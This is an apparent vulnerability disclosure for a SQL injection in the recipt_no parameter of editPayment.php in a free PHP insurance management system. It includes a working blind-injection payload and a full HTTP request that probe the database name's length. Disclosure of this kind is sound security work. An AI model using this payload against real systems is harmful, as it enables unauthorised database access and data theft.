# Insurance Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

vendors: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Vulnerability File: /insurance/editPayment.php?recipt_no=

Vulnerability location: /insurance/editPayment.php?recipt_no=,recipt_no

[+] Payload: /insurance/editPayment.php?recipt_no=1511989392_84501314%27%20and%20length(database())%20=4%20--+ // Leak place ---> recipt_no

Current database name: lims,length is 4

```sql
GET /insurance/editPayment.php?recipt_no=1511989392_84501314%27%20and%20length(database())%20=4%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=tmbv0mt5ff9hphhe0mtv4sghfq
Connection: close
```

When length (database ()) = 3, Content-Length: 4291
![image](https://user-images.githubusercontent.com/54017627/166145487-53e54e6c-90f2-49a1-b075-195f6e7656c8.png)

![image](https://user-images.githubusercontent.com/54017627/166145515-c2d0e7dd-d246-4911-9ed4-9151d04664ef.png)

When length (database ()) = 4, Content-Length: 5163

![image](https://user-images.githubusercontent.com/54017627/166145476-8610ca4a-93a6-4c5e-8816-96bd8f9a8455.png)

![image](https://user-images.githubusercontent.com/54017627/166145506-df8cad82-9676-4bd0-b253-ea03f43fc155.png)

